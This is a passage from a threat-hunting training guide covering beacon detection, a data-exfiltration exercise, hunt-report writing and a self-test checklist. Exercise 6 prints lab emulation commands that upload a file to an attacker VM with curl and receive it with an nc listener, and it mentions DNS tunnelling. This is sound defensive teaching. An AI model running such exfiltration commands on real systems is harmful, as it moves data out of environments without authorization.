- Nearly identical `orig_bytes`/`resp_bytes` per connection and a very short `duration`: a beacon that connects, checks in, and disconnects. Compare with the range's legitimate traffic, which varies.
- The destination is your **attacker VM inside the lab**, which is why this drill can be scored exactly: you know the ground truth. In a real environment, replace that certainty with corroboration from proxy logs, threat intel, and the owning process.
- Sysmon ID 3 attributing the connection to `powershell.exe` (or to whatever you launched), with `Initiated = true`. This is the step that converts a network lead into a finding — the network alone never says *which process*.
- The DNS variant shows up as repeated ID 22 events for the same name from the same image, with `QueryStatus` reflecting the failure. Note that a failed lookup still leaves a record: the attempt is the signal.
- **And, importantly, you should also find other beacon-like pairs that are not yours** — the operating system's own periodic checks, time synchronisation, and any monitoring you installed. Report them as triaged-false-positives with your reasoning. A hunt that reports only the planted beacon has learned nothing about noise.

**Pivots.**

- From the beaconing destination to every other internal host that contacted it — one C2 endpoint usually serves more than one victim.
- From the interval to the process: short and regular suggests a script or implant; long and irregular suggests a legitimate application.
- From `ssl.log` to the certificate: self-signed, mismatched, or reused across unrelated domains are leads.
- From the byte counts to the direction of data: a beacon that uploads more than it downloads is no longer just a heartbeat.
- From the destination IP to flow records, to see whether the range's own flow telemetry (if you run `nfcapd`) independently shows the same periodicity.
- From the process to its parent and its command line (Exercise 1), closing the loop from network behaviour to endpoint behaviour.

**Closing questions.**

- What is your minimum sample size before you will call something a beacon, and why?
- Which benign behaviour in your own lab produced the closest false positive, and what modifier distinguished it?
- If the payload were encrypted and the destination changed every day (domain rotation), which part of this hunt would survive?
- What would a heavily jittered beacon look like in your statistics, and how would you find it differently?

## Exercise 6 — Data exfiltration

**Objective.** Find data leaving the environment, and learn to separate exfiltration from the volume of legitimate outbound transfer.

**Starting hypothesis.** *"One internal host is transferring an unusually large volume of data to a single external destination, with a strongly asymmetric byte ratio, in a pattern that does not match its normal role."*

**Data required.** Zeek `conn.log` (`orig_bytes`/`resp_bytes`/`duration`), flow records (`nfdump` top talkers), proxy logs (bytes sent, `POST`, destination), DNS logs (record sizes and unique subdomain counts), Sysmon 3 for attribution.

**Steps.**

1. Establish the baseline volume of the range *before* exfiltrating: this drill is meaningless without a "normal" number to compare against.

```bash
# Per-destination byte totals for the window before your emulation
cat conn.log | zeek-cut id.orig_h id.resp_h orig_bytes resp_bytes duration \
  | awk '{ out[$1" -> "$2]+=$3; inb[$1" -> "$2]+=$4 } END { for (k in out) printf "%12d out  %12d in  %s\n", out[k], inb[k], k }' \
  | sort -nr | head -20
```

2. Emulate exfiltration, and seal your note. On the Windows victim:

```powershell
# Create a large lab file (content is irrelevant — the volume and destination are the signal)
fsutil file createnew C:\Users\labuser\AppData\Local\Temp\lab-data.bin 52428800

# Send it out over HTTP in one POST
curl.exe -X POST --data-binary "@C:\Users\labuser\AppData\Local\Temp\lab-data.bin" http://10.10.10.50:8000/
```

```bash
# Attacker side: receive the upload and discard it (keep the byte count in your notes)
nc -lvnp 8000 > /dev/null
```

For a DNS-tunnelling variant, run a lab-only authoritative DNS server and encode data in query names; keep this optional, and note that it needs a resolver you control (see `../tools/network-tools.md`).

3. Hunt by volume and asymmetry:

```bash
# Top talkers by outbound bytes — the fastest exfiltration triage in flow data
nfdump -R /var/flows -s srcip/bytes -n 20
nfdump -R /var/flows -s dstip/bytes -n 20

# Asymmetry: outbound bytes far exceeding inbound for one conversation
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p orig_bytes resp_bytes duration \
  | awk '$4 > 1000000 && $4 > ($5 * 10) { print }' | sort -k4 -nr | head -20
```

```spl
// Proxy view: large uploads, by client and destination
index=proxy method=POST
| stats sum(bytes_out) as uploaded count by src_ip, dest_host, username
| where uploaded > 10000000
| sort - uploaded
```

4. Look at the DNS channel as an alternative egress path:

```bash
# Long query names (encoded data) and many unique subdomains per domain
cat dns.log | zeek-cut query | awk '{ print length($0), $0 }' | sort -nr | head -20
cat dns.log | zeek-cut query | awk -F. 'NF>=2 { d=$(NF-1)"."$NF; c[d]++ } END { for (k in c) print c[k], k }' | sort -nr | head -20
```

5. Attribute the volume to a process and a user:

```powershell
Get-SysmonEvent -Id 3 | Where-Object { $_.DestinationIp -eq '10.10.10.50' } |
  Select-Object TimeCreated, User, Image, DestinationIp, DestinationPort, Initiated, SourcePort
```

6. Ask the questions that separate exfiltration from legitimate bulk transfer:

```text
- Does this host's role explain this volume? (a file server, yes; a workstation, no)
- Is the destination one the estate normally uses, or newly seen?
- Is the timing inside or outside the host's active hours?
- Is the protocol consistent with the data being moved (POST, SMB over the internet, DNS)?
- Is there a matching write on the endpoint (a file read or archive creation) in the same window?
- Did the same process touch staging artefacts (compressed archives, temp copies) first?
```

```powershell
# Endpoint-side staging: an archive written shortly before the transfer window
Get-SysmonEvent -Id 11 | Where-Object { $_.TargetFilename -match '\.(zip|7z|rar|tar|gz)$' } |
  Select-Object TimeCreated, User, Image, TargetFilename
```

**What you should find.**

- A single conversation — one internal source, one destination, one port — carrying an **outbound byte count orders of magnitude above the range baseline**, with a duration long enough to move that volume. When you express it as a ratio (`orig_bytes` ÷ `resp_bytes`), the number should be dramatically one-sided; a normal request/response conversation is roughly symmetric.
- In flow records, your Windows victim appearing in the top talkers by bytes where it was not before. That promotion is the practical finding: it is how an analyst with no PCAP at all would catch this.
- A pro-rata relationship between the emulated file size and the observed byte count. If the numbers do not roughly agree, one of your observations is wrong — investigate rather than explain it away.
- Sysmon ID 3 attributing the burst to `curl.exe` (or whichever client you used) with the destination port and a `SourcePort` you can correlate against Zeek's record of the same flow.
- On the DNS variant: a small number of domains with an outsized number of unique, long subdomains, query types that are not `A` in the majority, and steady upstream volume. Note that the *number of unique names* is a much better statistic than raw query count.
- **And the false positives you must document**: the range's ordinary outbound traffic, any package installation you did, and the flow records of your own downloads. Naming these is part of the deliverable.

**Pivots.**

- From the destination to every other internal host talking to it — an exfiltration endpoint is rarely used by one host only.
- From the time window to endpoint file activity (Sysmon 11 file creation, 23/26 deletion with archive) to find what was staged.
- From the process to its command line (Exercise 1) and its parent, to see whether it was user-driven, script-driven, or scheduled.
- From the connection to the DNS records for the same destination, to see whether names or bare IPs were used.
- From volume to content: if a proxy or TLS-terminating appliance logs the URL, the destination service tells you a great deal about intent.
- From this window to previous weeks, to ask whether this host has done it before — and how long it has been going on.

**Closing questions.**

- What is the single most useful pre-computed baseline you would want in a real environment before running this hunt, and how would you build it?
- Which of your emulated paths (HTTP POST, DNS, SMB) would survive an egress proxy that blocks everything except approved destinations?
- How would you distinguish a legitimate nightly backup from exfiltration using only flow data? What additional source settles it?
- If your flow exporter samples at 1 in 1000, which of your calculations become unreliable?

## Exercise 7 — Write the hunt report

**Objective.** Turn everything above into a document another analyst can verify, reproduce, and act on. A hunt that ends without a report has not happened.

**Starting hypothesis.** *"A written hunt is falsifiable: it states what was looked for, where, over what window, and what would have counted as evidence."*

**Data required.** Everything you produced: query texts, export files, event timestamps, process names, host names, byte counts, and your sealed emulation notes.

**Steps.**

1. Assemble the evidence into a folder per hunt, with the raw exports untouched:

```text
hunts/2026-09-18-beacon/
├── report.md                 # the write-up
├── queries/                  # every query exactly as run, with its time window
├── exports/                  # raw CSV/JSON/evtx/PCAP outputs, never edited
├── screenshots/              # only where a UI adds something the export cannot
└── emulation-note.md         # unsealed AFTER the hunt: what was actually done
```

2. Write the report to this structure:

```markdown
# Hunt report — <hypothesis in one line>

## 1. Scope and authorization
Hosts in scope, data sources, collection window (with time zone), and the
authorization under which the hunt ran.

## 2. Hypothesis
The question asked, and the specific behaviour that would count as an answer.

## 3. Data and coverage
Sources queried; the sources that were MISSING or partial; how you confirmed
telemetry was flowing. A hunt without a coverage statement is not evidence.

## 4. Queries run
Each query verbatim, with its time window, and what it was meant to exclude.

## 5. Findings
One block per finding: what was observed, which host/user/process, when, the
exact evidence (event ID, log file, byte count, hash), and a confidence level
with the reason for it.

## 6. Triaged negatives
Things that looked like a finding and were explained: what, why, and how you
verified the explanation. This section is where hunts earn trust.

## 7. Negative results
What was looked for and NOT found, with the coverage caveats that make the
negative meaningful.

## 8. Detection recommendation
The query or rule that should catch this next time, and the data it needs.
See ../methodology/05-detection-engineering.md.

## 9. Follow-ups
Unanswered questions, new hypotheses this hunt generated, and any telemetry
gap that blocked the analysis.
```

3. Verify your own report the way a reviewer would:

```text
[ ] Can a colleague reproduce every finding from the queries and exports alone?
[ ] Does every finding name a host, a time, and an artefact — not just a pattern?
[ ] Is every confidence statement justified by stated evidence?
[ ] Are the coverage gaps stated next to the negative results they qualify?
[ ] Are the emulation notes kept separate from the findings, so the reader can see
    what was ground truth and what was inferred?
[ ] If this hunt were wrong, what would have made it wrong? (Write that down too.)
```

**What you should find.** Not a technical artefact — a document that a stranger can act on. Concretely, you should be able to hand the report to someone who did not run the hunt and have them:

- reproduce at least one finding from your query text and its window;
- understand which behaviours you ruled out and why;
- see the telemetry gap that limited you, stated without excuses;
- take one detection away that closes the loop for the next occurrence.

**Pivots.**

- Every negative result is a new hypothesis. Absence of beaconing from hosts you did not have Zeek for is not absence of beaconing.
- Every triaged false positive is a tuning candidate. The benign behaviour you explained is a rule you must exclude, explicitly and in writing.
- Every detection recommendation is a hunt that no longer needs to be run by hand.

**Closing questions.**

- Which finding in your report has the weakest evidence, and what would strengthen it?
- Which of your hunts would survive a reviewer who insisted on a second, independent artefact for every claim?
- What did you conclude that your data could not support? Rewrite or withdraw that sentence.
- If you had to repeat this module's work from a clean range in a single day, which queries would you keep, and which would you discard?

## Common Mistakes & Tips

- **Reading the answer key first.** If you check your emulation note mid-hunt, you are verifying, not hunting. Seal it, hunt, then compare.
- **Hunting on a contaminated snapshot.** Revert before every exercise. Activity left over from the last drill is a false-positive factory.
- **Skipping the baseline.** "Unusual" is meaningless without a "usual". Take the baseline capture *before* emulating, in every drill.
- **Reporting a pattern instead of a finding.** "There was beaconing" is not a finding. "Host `win-victim` (`10.10.10.11`) opened 42 connections to `10.10.10.50:4444` between 14:02 and 14:23 UTC, mean interval 30.1 s, standard deviation 0.4 s, initiated by `powershell.exe` (PID logged), evidenced by `conn.log` lines N–M and Sysmon ID 3 at 14:02:11" is a finding.
- **Treating a low RITA score as a clearance.** Heavy jitter, long-poll HTTP, and domain fronting are engineered to look irregular.
- **Forgetting to attribute.** Network behaviour without a process, and process behaviour without an account, both leave the hunt inconclusive.
- **Ignoring the false positives you did find.** The benign beacons in your own range are the most instructive data you will collect; write them down with the reason they were benign.
- **No report.** Findings that live only in a chat window are lost, unverifiable, and useless to the next analyst.
- **Working outside the range.** Every command in this file is a real technique against a real system. Run it against your own authorized lab and nothing else.

## Checklist / Self-Test

- [ ] I verified telemetry end-to-end before hunting in every exercise.
- [ ] I recorded my emulation in a sealed note and did not read it until after the hunt.
- [ ] Exercise 1: I found the renamed binary by a field other than its path, and named the encoded PowerShell through its decoded script block.
- [ ] Exercise 2: I found persistence in at least two of the four mechanisms, from two independent artefacts.
- [ ] Exercise 3: I explained a logon-type anomaly for a service account and supported it with a second event.
- [ ] Exercise 4: I identified internal fan-out on administrative ports and attached a process to at least one connection.
- [ ] Exercise 5: I computed beacon interval mean and standard deviation myself, then confirmed the ranking with RITA.
- [ ] Exercise 6: I identified the transfer by byte asymmetry, and wrote down the legitimate traffic that looked similar.
- [ ] Exercise 7: I produced a report with scope, coverage, queries, findings, triaged negatives, and a detection recommendation.
- [ ] Every hunt lists the telemetry gaps that qualify its negative results.
- [ ] I reverted the range to its verified baseline after the final exercise.
- [ ] Every action I took was against a system I own or am authorized to test.

## Further Resources

- MITRE ATT&CK — attack.mitre.org (the technique vocabulary these hypotheses are written in).
- Atomic Red Team (technique emulation with ATT&CK IDs) — github.com/redcanaryco/atomic-red-team.
- Zeek log reference — docs.zeek.org/en/current/script-reference/log-files.html.
- RITA — github.com/activecountermeasures/rita.
- Sigma rules for turning findings into detections — github.com/SigmaHQ/sigma.
- Hayabusa and Chainsaw for EVTX triage — github.com/Yamato-Security/hayabusa, github.com/WithSecureLabs/chainsaw.
- The range used by these drills — `hunting-range-setup.md`.
- Official eCTHP page on the INE website for current, authoritative details about the certification.
